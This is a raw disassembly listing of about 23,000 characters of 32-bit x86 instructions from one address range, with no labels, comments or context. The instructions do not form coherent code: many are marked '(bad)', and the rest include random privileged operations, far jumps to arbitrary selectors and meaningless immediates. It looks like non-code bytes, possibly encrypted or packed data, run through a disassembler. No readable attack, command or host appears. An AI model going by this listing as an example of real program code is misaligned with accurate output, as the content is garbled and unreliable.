  4175b3:	adc    BYTE PTR [ebx],cl
  4175b5:	or     bl,BYTE PTR [ebp-0x14c64a3e]
  4175bb:	mov    bl,bl
  4175bd:	sbb    ecx,DWORD PTR [ecx+0x1a]
  4175c0:	cmp    al,0xea
  4175c2:	test   al,0x3
  4175c4:	mov    bh,0xeb
  4175c6:	jmp    FWORD PTR es:[esi]
  4175c9:	mov    dh,0xd
  4175cb:	dec    eax
  4175cc:	mov    WORD PTR [eax],cs
  4175ce:	adc    ecx,0xffffffc8
  4175d1:	or     DWORD PTR [ebp-0x3e],ecx
  4175d4:	jnp    0x417568
  4175d6:	cmp    esi,esp
  4175d8:	repnz pop es
  4175da:	adc    al,0xc3
  4175dc:	pop    ebp
  4175dd:	xchg   ecx,eax
  4175de:	pop    ds
  4175df:	dec    eax
  4175e0:	ins    DWORD PTR es:[edi],dx
  4175e1:	mov    WORD PTR [ebp-0x6c],fs
  4175e4:	sub    ch,BYTE PTR [edx-0x7c7c8fa]
  4175ea:	jge    0x417624
  4175ec:	outs   dx,BYTE PTR ds:[esi]
  4175ed:	jge    0x417632
  4175ef:	outs   dx,BYTE PTR ds:[esi]
  4175f0:	dec    ecx
  4175f1:	div    BYTE PTR [ebx-0x583698af]
  4175f7:	mov    BYTE PTR ds:0x7979380,dl
  4175fd:	scas   eax,DWORD PTR es:[edi]
  4175fe:	xlat   BYTE PTR ds:[ebx]
  4175ff:	mov    ah,BYTE PTR [edx+0x6af30c80]
  417605:	jno    0x4175c6
  417607:	bound  ebp,QWORD PTR [eax+0x656939d7]
  41760d:	nop
  41760e:	mov    eax,0xb7d1754e
  417613:	inc    ebx
  417614:	push   esi
  417615:	sbb    BYTE PTR ss:[ebp*1-0x3a913307],0x27
  41761e:	(bad)  
  417620:	cs dec ecx
  417622:	sub    eax,0xf6767ff2
  417627:	sbb    DWORD PTR [ebx+0x69cf141e],eax
  41762d:	inc    edi
  41762e:	inc    eax
  41762f:	push   0xdcd625a7
  417634:	push   edi
  417635:	add    esi,esi
  417637:	and    BYTE PTR ds:[edx+0x608e5cb0],al
  41763e:	jbe    0x4175db
  417640:	rcl    DWORD PTR [edi+0x7f04d853],0x2
  417647:	mov    dl,ch
  417649:	pop    edx
  41764a:	cmp    cl,bh
  41764c:	xor    eax,0x6185c91c
  417651:	scas   eax,DWORD PTR es:[edi]
  417652:	xor    dl,BYTE PTR [eax]
  417654:	or     cl,dl
  417656:	sbb    dl,BYTE PTR [ebp+edi*1-0x381a11bf]
  41765d:	mov    ch,0xa6
  41765f:	dec    ebp
  417660:	sbb    al,0xf7
  417662:	or     al,0x4b
  417664:	mov    ds:0x6a54a3f6,al
  417669:	(bad)  
  41766a:	imul   ecx,edx,0xffffff91
  41766d:	and    eax,0x0
	...
  4176d6:	test   eax,0xdf4fd367
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fiadd  DWORD PTR [edi]
  4176e3:	xchg   esp,eax
  4176e4:	cld    
  4176e5:	or     ah,BYTE PTR [edi-0x4]
  4176e8:	add    BYTE PTR [eax],al
  4176ea:	add    BYTE PTR [ecx],al
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	lods   eax,DWORD PTR ds:[esi]
  4176ef:	pop    ebx
  4176f0:	or     eax,0x59f0db9f
  4176f5:	inc    ebx
  4176f6:	adc    bl,BYTE PTR [esi]
  4176f8:	sbb    DWORD PTR [ecx+0x13],eax
  4176fb:	mul    BYTE PTR [ebx-0x12]
  4176fe:	sub    ebp,edi
  417700:	xlat   BYTE PTR ds:[ebx]
  417701:	das    
  417702:	and    ch,bh
  417704:	mov    ch,0xe8
  417706:	cdq    
  417707:	push   edi
  417708:	cdq    
  417709:	jl     0x4176dd
  41770b:	add    BYTE PTR [ebp+0x633a9266],0xc6
  417712:	mov    al,0x53
  417714:	or     bh,cl
  417716:	lock aad 0xf6
  417719:	bound  esi,QWORD PTR [ecx-0x64]
  41771c:	cs add al,0xca
  41771f:	adc    eax,0xbfd69ea
  417724:	imul   ebp,DWORD PTR es:[eax+0x14],0x516f1dd7
  41772c:	sbb    eax,0x1835f2f6
  417731:	call   0xeb54:0xf0c1aa3b
  417738:	mov    ebp,0xb7ef4e66
  41773d:	add    eax,0x49e4cdd6
  417742:	ins    DWORD PTR es:[edi],dx
  417743:	inc    edx
  417744:	ror    BYTE PTR [ecx-0x190319ae],1
  41774a:	ret    0x5e39
  41774d:	cli    
  41774e:	add    ch,0xd2
  417751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417752:	mov    cl,0x4f
  417754:	loope  0x417755
  417756:	(bad)  
  417757:	xor    DWORD PTR [edx],esi
  417759:	mov    bh,0xf4
  41775b:	mov    esp,DWORD PTR [esi]
  41775d:	js     0x4177bf
  41775f:	or     BYTE PTR [edx],ah
  417761:	call   0x3da3158f
  417766:	dec    esi
  417767:	inc    esi
  417768:	mov    bh,0x3b
  41776a:	fadd   QWORD PTR [esi+ebx*4-0x4f33f63d]
  417771:	push   edx
  417772:	sub    al,0x54
  417774:	jmp    0x41777b
  417776:	mul    ch
  417778:	addr16 cdq 
  41777a:	iret   
  41777b:	ret    
  41777c:	lock cwde 
  41777e:	fst    QWORD PTR [ecx-0x2daaf1ef]
  417784:	push   ds
  417785:	sbb    al,0x2c
  417787:	dec    esp
  417788:	out    dx,al
  417789:	sahf   
  41778a:	dec    esi
  41778b:	or     bl,BYTE PTR [eax-0xf]
  41778e:	shl    BYTE PTR [ecx-0x1b9bf419],1
  417794:	push   ss
  417795:	sub    BYTE PTR [ecx-0x78],dh
  417798:	mov    esi,0x405f036e
  41779d:	jl     0x417816
  41779f:	arpl   cx,sp
  4177a1:	pop    eax
  4177a2:	in     eax,dx
  4177a3:	fs std 
  4177a5:	xchg   esi,eax
  4177a6:	jmp    0x9e570288
  4177ab:	daa    
  4177ac:	jp     0x417752
  4177ae:	dec    eax
  4177af:	mov    fs,WORD PTR [edi-0x4d]
  4177b2:	mov    al,ds:0x611e41b2
  4177b7:	aad    0x9c
  4177b9:	or     al,0xb7
  4177bb:	mov    WORD PTR [ebx],ds
  4177bd:	rcl    DWORD PTR [ebp-0x12],1
  4177c0:	push   es
  4177c1:	imul   esp,DWORD PTR [eax],0xffffffd5
  4177c4:	jbe    0x4177c6
  4177c6:	imul   edi,DWORD PTR [edx],0xaf6ff617
  4177cc:	stc    
  4177cd:	(bad)  
  4177ce:	jle    0x417787
  4177d0:	cwde   
  4177d1:	xor    bh,0x94
  4177d4:	fistp  QWORD PTR [ecx+0x31]
  4177d7:	fwait
  4177d8:	mov    cl,0x6c
  4177da:	jle    0x4177de
  4177dc:	retf   
  4177dd:	jo     0x417791
  4177df:	ins    DWORD PTR es:[edi],dx
  4177e0:	cmc    
  4177e1:	out    dx,al
  4177e2:	push   edi
  4177e3:	mov    eax,ds:0x4b2305b9
  4177e8:	ret    0xd9ac
  4177eb:	xor    ecx,ebp
  4177ed:	sbb    al,0x0
	...
  417853:	add    BYTE PTR [eax],al
  417855:	add    cl,ch
  417857:	push   cs
  417858:	(bad)  
  417859:	pop    ss
  41785a:	push   edi
  41785c:	jmp    0x2334185f
  417861:	rol    BYTE PTR [ebx-0x37],cl
  417864:	xchg   edi,eax
  417865:	xlat   BYTE PTR ds:[ebx]
  417866:	addr16 std 
  417868:	add    BYTE PTR [eax],al
  41786a:	add    BYTE PTR [ecx],al
  41786c:	add    BYTE PTR [eax],al
  41786e:	and    al,0x2e
  417870:	sub    dl,BYTE PTR [esi+0xf257229]
  417876:	dec    esp
  417877:	inc    edx
  417878:	xchg   DWORD PTR [esi-0x13],edx
  41787b:	inc    edi
  41787c:	in     eax,0x18
  41787e:	aaa    
  41787f:	xchg   ecx,eax
  417880:	push   ds
  417881:	pusha  
  417882:	sahf   
  417883:	out    dx,eax
  417884:	push   cs
  417885:	call   0xa9d2:0x8eed5449
  41788c:	shl    DWORD PTR ss:[edi-0x3b2883d5],0x77
  417894:	xor    dl,al
  417896:	jae    0x417831
  417898:	push   ecx
  417899:	pop    ss
  41789a:	(bad)
  41789d:	jae    0x417873
  41789f:	fcmovnb st,st(3)
  4178a1:	adc    eax,0x7007976d
  4178a6:	lods   eax,DWORD PTR ds:[esi]
  4178a7:	leavew 
  4178a9:	jo     0x417919
  4178ab:	loope  0x41789b
  4178ad:	mov    esi,0xa75e3593
  4178b2:	pop    esi
  4178b3:	sub    eax,0xe7fafd55
  4178b8:	fidivr WORD PTR [edi+0x699b7b78]
  4178be:	mov    ecx,edx
  4178c0:	sub    dh,BYTE PTR [esi+0x6cf14adc]
  4178c6:	jne    0x4178ea
  4178c8:	and    ebx,DWORD PTR [ebx-0x351bed8e]
  4178ce:	jbe    0x41790f
  4178d0:	pop    esi
  4178d1:	sub    BYTE PTR [ebp+edi*1-0x1d],cl
  4178d5:	ret    0x2e9f
  4178d8:	push   0xffffffe9
  4178da:	dec    eax
  4178db:	or     ebp,ebp
  4178dd:	push   0x59
  4178df:	xor    al,0xae
  4178e1:	(bad)
  4178e4:	cs scas eax,DWORD PTR es:[edi]
  4178e6:	out    dx,al
  4178e7:	imul   esi,edx,0xffc40157
  4178ed:	imul   ecx,DWORD PTR [esi-0x74ba6d0e],0xffffff88
  4178f4:	mul    BYTE PTR [edi]
  4178f6:	ins    DWORD PTR es:[edi],dx
  4178f7:	hlt    
  4178f8:	in     eax,0x34
  4178fa:	sub    DWORD PTR [ecx+edi*1],ecx
  4178fd:	(bad)  
  4178fe:	(bad)  
  4178ff:	jmp    0xab59:0x1bb2a393
  417906:	stos   DWORD PTR es:[edi],eax
  417907:	dec    esi
  417908:	sar    BYTE PTR [edi],0x93
  41790b:	ret    0x546
  41790e:	lds    edx,FWORD PTR [ebx]
  417910:	mov    bl,0xd9
  417912:	icebp  
  417913:	mov    edi,0xc5aa4dc2
  417918:	mov    ?,WORD PTR [eax-0x3a]
  41791b:	inc    esi
  41791c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41791e:	sahf   
  41791f:	pop    eax
  417920:	cmp    ebp,0xffffffc6
  417923:	out    0x70,al
  417925:	cmp    edi,esi
  417927:	dec    ebp
  417928:	(bad)  
  417929:	imul   edi,DWORD PTR [esi+0x11],0xc9c70bff
  417930:	test   DWORD PTR [eax],ebp
  417932:	jg     0x417979
  417934:	xor    dl,dl
  417936:	stc    
  417937:	arpl   WORD PTR [ebx],si
  417939:	mov    al,0x58
  41793b:	mov    ah,0x84
  41793d:	add    al,0xc9
  41793f:	wrmsr  
  417941:	out    0x81,eax
  417943:	jl     0x41797a
  417945:	adc    esi,esi
  417947:	loope  0x417909
  417949:	mov    WORD PTR [esp+esi*2-0x6ba479f4],cs
  417950:	leave  
  417951:	stc    
  417952:	xchg   BYTE PTR [ebx-0x440f0cd0],al
  417958:	or     esp,DWORD PTR [edx-0x5f]
  41795b:	neg    al
  41795d:	loop   0x4179c7
  41795f:	(bad)  
  417960:	and    bl,ch
  417962:	or     al,BYTE PTR [edi]
  417964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417965:	mov    eax,0x83240e9e
  41796a:	cmp    dh,BYTE PTR [ebx+0xae0f]
	...
  4179d4:	add    BYTE PTR [eax],al
  4179d6:	pop    eax
  4179d7:	inc    ecx
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	push   ecx
  4179e3:	in     al,dx
  4179e4:	sbb    eax,0xfe67e2
  4179e9:	add    BYTE PTR [eax],al
  4179eb:	add    DWORD PTR [eax],eax
  4179ed:	add    BYTE PTR [edi-0x49425515],cl
  4179f3:	push   0x59
  4179f5:	arpl   sp,dx
  4179f7:	push   edi
  4179f8:	and    ecx,DWORD PTR [ebp+0x13f0a7ef]
  4179fe:	iret   
  4179ff:	out    dx,al
  417a00:	inc    ebx
  417a01:	mov    dl,0x12
  417a03:	lds    ecx,FWORD PTR [edi+edx*1-0x9a8ee98]
  417a0a:	mov    eax,0xbacb402
  417a0f:	inc    ecx
  417a10:	repnz ficom WORD PTR [edi+eiz*4-0x53]
  417a15:	test   DWORD PTR [eax+0x26],esi
  417a18:	xchg   edi,eax
  417a19:	sbb    DWORD PTR [ebx],0x77965c02
  417a1f:	jge    0x417a28
  417a21:	mov    al,0xe4
  417a23:	sub    al,0xc1
  417a25:	push   cs
  417a26:	adc    dl,0x87
  417a29:	ret    0xf73a
  417a2c:	cmp    al,0xd
  417a2e:	aam    0x55
  417a30:	inc    esi
  417a31:	sub    edi,eax
  417a33:	ss in  al,0x4
  417a36:	cmp    esi,edx
  417a38:	xor    al,0xed
  417a3a:	cmp    edx,DWORD PTR [eax-0x11e87398]
  417a40:	mul    BYTE PTR ds:0x1f6bf842
  417a46:	int3   
  417a47:	cmp    ebp,DWORD PTR [ebp-0x31]
  417a4a:	ins    BYTE PTR es:[edi],dx
  417a4b:	xchg   ecx,eax
  417a4c:	jg     0x4179e8
  417a4e:	test   eax,ebp
  417a50:	inc    ebp
  417a51:	xchg   ecx,eax
  417a52:	push   0x22
  417a54:	and    al,0xc6
  417a56:	cmp    DWORD PTR [esi],edx
  417a58:	adc    edx,DWORD PTR [esi]
  417a5a:	or     DWORD PTR [esi+edx*4-0x39],edx
  417a5e:	iret   
  417a5f:	sub    DWORD PTR [ecx+0x70],edi
  417a62:	jp     0x417a65
  417a64:	sbb    BYTE PTR [edi-0x1d5a1260],bl
  417a6a:	cli    
  417a6b:	out    0x45,al
  417a6d:	sub    dh,BYTE PTR [edi]
  417a6f:	mov    dh,0xfd
  417a71:	call   0xd1fbaded
  417a76:	rcl    BYTE PTR [ebx+0x6d],0xf3
  417a7a:	imul   edx,DWORD PTR [ebx+0x94feeb0],0x76
  417a81:	ja     0x417ae0
  417a83:	scas   eax,DWORD PTR es:[edi]
  417a84:	xor    esi,DWORD PTR [ecx]
  417a86:	pop    ds
  417a87:	js     0x417ab0
  417a89:	idiv   bh
  417a8b:	les    eax,FWORD PTR [ebx-0xe]
  417a8e:	outs   dx,BYTE PTR ds:[esi]
  417a8f:	mov    esp,0x5729f923
  417a94:	dec    edi
  417a95:	pop    ss
  417a96:	jo     0x417b0d
  417a98:	inc    ebx
  417a99:	xor    cl,bh
  417a9b:	and    BYTE PTR [edi-0x4f],bl
  417a9e:	lahf   
  417a9f:	sub    BYTE PTR [edx+eiz*4-0x65],al
  417aa3:	add    al,0x5f
  417aa5:	ds pop esp
  417aa7:	dec    esi
  417aa8:	test   al,0x1d
  417aaa:	push   ebx
  417aab:	dec    ebp
  417aac:	or     DWORD PTR [ecx],0x3847214f
  417ab2:	xchg   al,bh
  417ab4:	xchg   ebx,eax
  417ab5:	mov    al,0x3e
  417ab7:	add    al,0x79
  417ab9:	dec    esp
  417aba:	xlat   BYTE PTR ds:[ebx]
  417abb:	pusha  
  417abc:	mov    ecx,0x705badbf
  417ac1:	jecxz  0x417adc
  417ac3:	mov    esi,0x7d551d0c
  417ac8:	dec    edx
  417ac9:	out    0xdc,eax
  417acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417acc:	and    eax,0x89c0a4ca
  417ad1:	mov    edi,0x5cf3513e
  417ad6:	sahf   
  417ad7:	hlt    
  417ad8:	les    esp,FWORD PTR [edi+0x1fba0aff]
  417ade:	stc    
  417adf:	mov    ebx,0x4d402be6
  417ae4:	lock arpl sp,dx
  417ae7:	and    dh,BYTE PTR [ebx-0x22]
  417aea:	clc    
  417aeb:	(bad)  
  417aec:	leave  
  417aed:	push   cs
	...
  417b56:	das    
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx+0x51302077]
  417b66:	inc    DWORD PTR [bx+si]
  417b69:	add    BYTE PTR [eax],al
  417b6b:	add    DWORD PTR [eax],eax
  417b6d:	add    BYTE PTR [edi-0x8],ah
  417b70:	jmp    0x932e:0x62b5dff4
  417b77:	dec    edi
  417b78:	xor    eax,0xd19cd954
  417b7d:	out    0x46,al
  417b7f:	(bad)  
  417b80:	adc    eax,0x249a023c
  417b85:	aaa    
  417b86:	fs mov ebx,0xbe1c453
  417b8c:	mov    bl,0x69
  417b8e:	xor    DWORD PTR [ebx+0x67251446],esp
  417b94:	dec    edi
  417b95:	jbe    0x417bef
  417b97:	lahf   
  417b98:	nop
  417b99:	call   0x93e6:0xac20b0d1
  417ba0:	shl    edi,0xf
  417ba3:	lea    esi,[ecx+0x3d]
  417ba6:	push   edx
  417ba7:	sahf   
  417ba8:	xor    eax,0x339118
  417bad:	mov    eax,ds:0xdd089ef8
  417bb2:	xchg   ebp,eax
  417bb3:	and    BYTE PTR [edi-0x3dd6290c],bl
  417bb9:	mov    bh,0xb4
  417bbb:	dec    ebx
  417bbc:	into   
  417bbd:	pop    esi
  417bbe:	xchg   esp,eax
  417bbf:	sub    DWORD PTR [ebx+0x4be05ab4],edx
  417bc5:	icebp  
  417bc6:	mov    ebp,0x65326153
  417bcb:	mov    edx,0x5401ca58
  417bd0:	mov    ch,0xf6
  417bd2:	cmp    BYTE PTR [edx+0x54bbc1c],0x2a
  417bd9:	mov    bl,0x14
  417bdb:	neg    DWORD PTR [ebp+eax*8+0x1d]
  417bdf:	mov    BYTE PTR [edx-0x50c40876],cl
  417be5:	add    BYTE PTR [ebx-0x46a7d6ce],0xf4
  417bec:	jl     0x417bc1
  417bee:	stos   BYTE PTR es:[edi],al
  417bef:	sbb    ebp,DWORD PTR [edi]
  417bf1:	hlt    
  417bf2:	or     ecx,DWORD PTR [ebx]
  417bf4:	jae    0x417bd1
  417bf6:	cli    
  417bf7:	mov    dh,0x37
  417bf9:	mov    ds:0x6951cf0a,eax
  417bfe:	mov    ds:0x18b23059,eax
  417c03:	retf   
  417c04:	arpl   WORD PTR [edx],dx
  417c06:	dec    esp
  417c07:	ds stos DWORD PTR es:[edi],eax
  417c09:	mov    esi,0x6633c49a
  417c0e:	jne    0x417be3
  417c10:	pushf  
  417c11:	clc    
  417c12:	jnp    0x417bc2
  417c14:	cmc    
  417c15:	shl    BYTE PTR [esp+eax*8],cl
  417c18:	and    DWORD PTR [edx+esi*2+0x1f],ebx
  417c1c:	rcl    BYTE PTR [edi],1
  417c1e:	retf   0x73dd
  417c21:	pop    esi
  417c22:	test   eax,0xa870bc38
  417c27:	xor    DWORD PTR [edi+edi*4],ebp
  417c2a:	mov    eax,ds:0x93ac6b71
  417c2f:	or     eax,0x6bca738c
  417c34:	jp     0x417c9d
  417c36:	stos   DWORD PTR es:[edi],eax
  417c37:	fiadd  DWORD PTR [edi+0x38cebf41]
  417c3d:	sbb    eax,ebx
  417c3f:	ret    0xb6e4
  417c42:	adc    edi,DWORD PTR [eax+eiz*4]
  417c45:	jmp    0x417c63
  417c47:	out    dx,eax
  417c48:	cmp    DWORD PTR [ebx+0x1deccec6],edx
  417c4e:	add    DWORD PTR [ecx+0x18],edi
  417c51:	dec    eax
  417c52:	lods   eax,DWORD PTR ds:[esi]
  417c53:	mov    esp,0xcb814d66
  417c58:	mov    dl,0x6
  417c5a:	leave  
  417c5b:	push   es
  417c5c:	cmc    
  417c5d:	addr16 das 
  417c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c60:	add    edi,DWORD PTR [ebx-0x77eeef69]
  417c66:	ficom  WORD PTR [edx-0x4e]
  417c69:	shl    BYTE PTR [ecx],0x7
  417c6c:	xlat   BYTE PTR ds:[ebx]
  417c6d:	add    eax,0x0
	...
  417cd6:	mov    eax,eax
  417cd8:	nop
  417cd9:	test   cl,bl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0xa6
  417ce3:	mov    ecx,0x67ca6e
  417ce8:	add    DWORD PTR [eax],eax
  417cea:	add    BYTE PTR [ecx],al
  417cec:	add    BYTE PTR [eax],al
  417cee:	add    eax,0x8616a435
  417cf3:	jle    0x417c98
  417cf5:	lods   eax,DWORD PTR ds:[esi]
  417cf6:	xchg   esi,eax
  417cf7:	(bad)  
  417cf8:	dec    DWORD PTR [edx-0x47]
  417cfb:	sbb    esp,edx
  417cfd:	cmp    al,0x51
  417cff:	test   eax,0xbe41c619
  417d04:	mov    ds:0xc9f3ed56,al
  417d09:	retf   
  417d0a:	mov    esi,0xad4f2ce2
  417d0f:	arpl   WORD PTR [edi],dx
  417d11:	repnz jmp FWORD PTR [ebp+esi*8-0x32]
  417d16:	in     eax,0xfc
  417d18:	xchg   ecx,eax
  417d19:	push   ebx
  417d1a:	inc    eax
  417d1b:	cld    
  417d1c:	and    DWORD PTR [edx],esp
  417d1e:	sbb    BYTE PTR [ecx+0x4f],bh
  417d21:	xchg   ebp,eax
  417d22:	pusha  
  417d23:	mov    ebp,eax
  417d25:	dec    esp
  417d26:	pop    ds
  417d27:	add    al,0x7c
  417d29:	mov    DWORD PTR [edx+0x59],eax
  417d2c:	aas    
  417d2d:	call   0x67d69795
  417d32:	xchg   ebp,eax
  417d33:	loope  0x417d38
  417d35:	jnp    0x417cb9
  417d37:	jno    0x417d6d
  417d39:	outs   dx,BYTE PTR ds:[esi]
  417d3a:	test   eax,0x96ec7719
  417d3f:	mov    eax,0xd3080ef9
  417d44:	inc    esp
  417d45:	aas    
  417d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d47:	lahf   
  417d48:	je     0x417cd4
  417d4a:	xchg   edx,eax
  417d4b:	rcr    DWORD PTR [eax-0x76],cl
  417d4e:	sbb    ah,bl
  417d50:	pop    ebp
  417d51:	frstor [eax+0x23794a45]
  417d57:	sti    
  417d58:	loope  0x417dbb
  417d5a:	add    al,al
  417d5c:	inc    ebp
  417d5d:	shl    BYTE PTR [edi-0x58],0x1e
  417d61:	jae    0x417d62
  417d63:	shl    dl,1
  417d65:	shl    esi,1
  417d67:	sbb    DWORD PTR [eax],esi
  417d69:	shl    DWORD PTR [ebx-0x7e],0xf9
  417d6d:	fsubp  st(0),st
  417d6f:	mov    dh,0xd5
  417d71:	jmp    0x417d14
  417d73:	ins    DWORD PTR es:[edi],dx
  417d74:	jb     0x417d29
  417d76:	test   eax,0x7cc1374
  417d7b:	pop    edx
  417d7c:	pop    ds
  417d7d:	cli    
  417d7e:	and    ebp,ecx
  417d80:	mov    ds:0x362e42f3,al
  417d85:	aas    
  417d86:	mov    edi,esi
  417d88:	adc    ebp,ebp
  417d8a:	pusha  
  417d8b:	aad    0xbc
  417d8d:	data16 lods al,BYTE PTR ds:[esi]
  417d8f:	mov    edi,0x32f21315
  417d94:	pop    ecx
  417d95:	add    al,BYTE PTR [esi]
  417d97:	push   es
  417d98:	out    0xcc,al
  417d9a:	test   BYTE PTR [esi+0x3146a1b9],0x28
  417da1:	pop    ss
  417da2:	jno    0x417e0b
  417da4:	in     al,dx
  417da5:	push   0xffffffd4
  417da7:	and    edx,DWORD PTR [edi-0x1f29f8f0]
  417dad:	cs inc ebx
  417daf:	icebp  
  417db0:	jmp    0xbfe48120
  417db5:	mov    ds:0x26c35232,al
  417dba:	pop    esi
  417dbb:	stos   BYTE PTR es:[edi],al
  417dbc:	inc    edx
  417dbd:	mov    DWORD PTR [esi-0x812601],ebx
  417dc3:	mov    edx,0x793593b0
  417dc8:	add    BYTE PTR [ebp+0x4a],dh
  417dcb:	pusha  
  417dcc:	icebp  
  417dcd:	cmp    BYTE PTR [ecx-0x38],bl
  417dd0:	test   BYTE PTR [ebp+0x7b57a4aa],ch
  417dd6:	bound  ebp,QWORD PTR [edx-0x26]
  417dd9:	mov    ds:0xeb1d1e6b,eax
  417dde:	(bad)  
  417ddf:	and    al,0xa2
  417de1:	imul   edx,eax,0x66e2b221
  417de7:	xchg   ebp,eax
  417de8:	mov    al,0xa7
  417dea:	movnti DWORD PTR [eax],eax
  417ded:	push   edi
	...
  417e56:	pop    ss
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	adc    DWORD PTR [ecx+eiz*2],edx
  417e65:	mov    ah,BYTE PTR [edi+0x1]
  417e68:	add    DWORD PTR [eax],eax
  417e6a:	add    BYTE PTR [ecx],al
  417e6c:	add    BYTE PTR [eax],al
  417e6e:	cld    
  417e6f:	scas   eax,DWORD PTR es:[edi]
  417e70:	jae    0x417e54
  417e72:	call   0xbc50:0x997d7dc1
  417e79:	(bad)  
  417e7b:	dec    edi
  417e7c:	mov    ds:0x3d618d7a,al
  417e81:	lods   al,BYTE PTR ds:[esi]
  417e82:	sbb    al,cl
  417e84:	inc    esi
  417e85:	jnp    0x417e5c
  417e87:	push   ebx
  417e88:	dec    edx
  417e89:	arpl   ax,si
  417e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e8c:	das    
  417e8d:	ins    BYTE PTR es:[edi],dx
  417e8e:	ds retf 
  417e90:	scas   eax,DWORD PTR es:[edi]
  417e91:	outs   dx,BYTE PTR ds:[esi]
  417e92:	fmul   st,st(2)
  417e94:	retf   0xb46
  417e97:	fs pop ds
  417e99:	out    0xd5,al
  417e9b:	gs inc edi
  417e9d:	mov    esp,0x9126430e
  417ea2:	sbb    eax,ebp
  417ea4:	mov    dl,0x5b
  417ea6:	push   esp
  417ea7:	cvtpi2ps xmm0,QWORD PTR [ebx-0x6a9cf8ad]
  417eae:	cmp    al,BYTE PTR [edi]
  417eb0:	pop    ss
  417eb1:	sub    bl,ch
  417eb3:	mov    bl,0xeb
  417eb5:	test   eax,0x6c2b1d84
  417eba:	fwait
  417ebb:	shr    DWORD PTR [ebp-0xe092693],cl
  417ec1:	loop   0x417efa
  417ec3:	and    DWORD PTR [edx-0x281b67b9],edi
  417ec9:	xcrypt-ofb (bad)
  417eca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ecb:	sub    eax,0x9feb298e
  417ed0:	outs   dx,DWORD PTR ds:[esi]
  417ed1:	pop    esi
  417ed2:	(bad)  
  417ed3:	jl     0x417f10
  417ed5:	sub    al,dl
  417ed7:	shl    BYTE PTR [ecx+ebx*8],1
  417eda:	popf   
  417edb:	cmp    DWORD PTR [ebx],esi
  417edd:	bnd ja 0x417f19
  417ee0:	mov    esp,0x2d651355
  417ee5:	xor    DWORD PTR ds:0x1ae074dd,edx
  417eeb:	test   BYTE PTR [ecx-0x27f77467],al
  417ef1:	aam    0xb9
  417ef3:	pop    ebx
  417ef4:	loop   0x417f3e
  417ef6:	add    ch,ch
  417ef8:	jmp    0x417f0d
  417efa:	out    0xcb,eax
  417efc:	loope  0x417eb3
  417efe:	cdq    
  417eff:	jmp    0x417f12
  417f01:	cmp    eax,0xcc43bf51
  417f06:	sub    ecx,DWORD PTR [edi]
  417f08:	das    
  417f09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f0a:	jnp    0x417f54
  417f0c:	or     BYTE PTR [ebx+0x153821f4],dl
  417f12:	je     0x417f0c
  417f14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f15:	pushf  
  417f16:	push   eax
  417f17:	or     ecx,DWORD PTR [ecx+0x7c]
  417f1a:	add    ah,BYTE PTR [eax]
  417f1c:	in     al,0x8a
  417f1e:	pushf  
  417f1f:	daa    
  417f20:	sub    dl,ah
  417f22:	hlt    
  417f23:	lahf   
  417f24:	pop    ds
  417f25:	retf   0x15c7
  417f28:	mov    ds:0xa074dc89,al
  417f2d:	add    dh,BYTE PTR [eax]
  417f2f:	popf   
  417f30:	mov    bl,0x1e
  417f32:	inc    esp
  417f33:	inc    edi
  417f34:	scas   al,BYTE PTR es:[edi]
  417f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f36:	push   ss
  417f37:	(bad)  
  417f39:	push   es
  417f3a:	jbe    0x417fa9
  417f3c:	fisttp DWORD PTR [edx-0x5c]
  417f3f:	mov    edi,0xf063a0c9
  417f44:	std    
  417f45:	pop    ebx
  417f46:	fistp  DWORD PTR [esi+esi*8]
  417f49:	popf   
  417f4a:	(bad)  
  417f4b:	pop    eax
  417f4c:	ror    DWORD PTR [ebx-0x679a0da6],cl
  417f52:	mov    ss,WORD PTR [esi]
  417f54:	mov    edx,esp
  417f56:	pushf  
  417f57:	cmp    BYTE PTR [esi+esi*4+0x1301809],ch
  417f5e:	sub    DWORD PTR [ebx+0x6],ebx
  417f61:	add    eax,DWORD PTR [ebx+0x63ede875]
  417f67:	sar    DWORD PTR [edx-0x1ff38815],0xa0
	...
  417fd6:	(bad)  
  417fd7:	out    0xe6,al
  417fd9:	cmp    esp,esi
  417fdb:	cmp    edi,edi
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	push   ecx
  417fe3:	xor    DWORD PTR [esi+edx*8+0x10267],eax
  417fea:	add    BYTE PTR [ecx],al
  417fec:	add    BYTE PTR [eax],al
  417fee:	pop    edi
  417fef:	or     cl,BYTE PTR [edx+0x9]
  417ff2:	bound  esi,QWORD PTR [ecx-0x51fa2ea8]
  417ff8:	(bad)  [edi]
  417ffa:	adc    bh,BYTE PTR [ecx-0x3c223d74]
  418000:	xchg   BYTE PTR [ebx-0x75],ah
  418003:	cmp    ah,bh
  418005:	sbb    eax,0x7fd56c25
  41800a:	or     bl,BYTE PTR [ebp-0x3ff99cb5]
  418010:	pop    edi
  418011:	push   ecx
  418012:	pop    esi
  418013:	ret    0x9b85
  418016:	retf   
